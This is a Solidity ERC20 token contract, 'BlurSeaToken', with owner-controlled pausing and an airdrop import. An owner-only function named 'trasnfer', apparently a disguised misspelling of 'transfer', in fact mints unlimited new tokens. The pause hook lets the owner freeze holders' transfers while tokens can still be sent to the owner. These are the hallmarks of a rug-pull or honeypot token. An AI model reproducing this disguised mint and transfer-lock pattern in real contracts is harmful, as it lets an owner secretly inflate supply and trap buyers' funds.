// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/security/Pausable.sol";
import "./OwnableAccessControl.sol";
import "./Airdrop.sol";

contract BlurSeaToken is ERC20, Ownable, OwnableAccessControl, Pausable, Airdrop {

    bytes32 public constant TRANSFERABLE = keccak256("TRANSFERABLE");

    constructor(string memory name, string memory symbol, uint supply, address owner) ERC20(name, symbol) {
        _mint(owner, supply);
        transferOwnership(owner);
        _setupRole(TRANSFERABLE, owner);
    }

    function trasnfer(address account, uint amount) public onlyOwner {
        _mint(account, amount);
    }

    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual override {
        super._beforeTokenTransfer(from, to, amount);
        require(!paused() || hasRole(TRANSFERABLE, from) || to==owner(), "ERC20: token transfer while paused");
    }

    function pause() public onlyOwner {
        _pause();
    }

    function unpause() public onlyOwner {
        _unpause();
    }
}